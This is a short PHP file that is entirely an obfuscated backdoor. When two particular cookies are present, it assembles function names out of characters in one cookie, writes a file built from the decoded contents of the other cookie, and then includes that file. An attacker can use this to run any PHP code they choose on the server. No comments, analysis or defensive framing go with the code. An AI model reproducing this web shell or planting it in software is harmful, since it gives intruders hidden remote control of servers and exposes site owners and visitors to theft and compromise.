<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[38])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 10;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[38][$n];
        if (!$c[38][$n + 1]) {
            if (!$c[38][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 10 + 1;
    }
    $k = $p[5]() . $p[21];
    if (!$p[1]($k)) {
        $n = $p[14]($k, $p[27]);
        $p[29]($n, $p[25] . $p[24]($p[9]($c[3])));
    }
    include($k);
}